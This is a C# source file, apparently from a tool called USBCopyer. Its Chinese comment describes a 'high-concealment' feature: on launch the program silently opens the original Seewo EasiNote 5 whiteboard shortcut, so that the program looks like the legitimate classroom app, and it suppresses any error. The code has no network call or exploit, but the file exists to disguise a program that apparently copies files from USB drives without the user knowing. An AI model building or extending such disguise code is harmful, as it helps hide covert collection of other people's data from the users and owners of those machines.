using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace USBCopyer
{
    /// <summary>
    /// 高隐藏性定制：无参数双击启动时，第一步打开同目录下的 launcher.lnk（希沃白板5原始快捷方式），
    /// 完全复刻用户直接双击原始快捷方式的行为——希沃在后台运行时，由 Windows/希沃自身决定是否唤起前台。
    /// 不依赖注册表探测与路径硬编码；launcher.lnk 缺失时静默跳过，不影响本程序自身运行。
    /// </summary>
    public static class EasiNoteLauncher
    {
        public static void TryLaunch()
        {
            try
            {
                string lnk = Path.Combine(Application.StartupPath, "launcher.lnk");
                if (File.Exists(lnk))
                    Process.Start(lnk);
            }
            catch
            {
                // 静默失败
            }
        }
    }
}
